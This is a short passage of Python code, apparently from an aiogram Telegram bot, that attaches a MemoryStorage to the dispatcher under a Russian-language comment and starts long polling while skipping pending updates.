    # Подключаем MemoryStorage к боту
    dp.storage = storage
    executor.start_polling(dp, skip_updates=True)
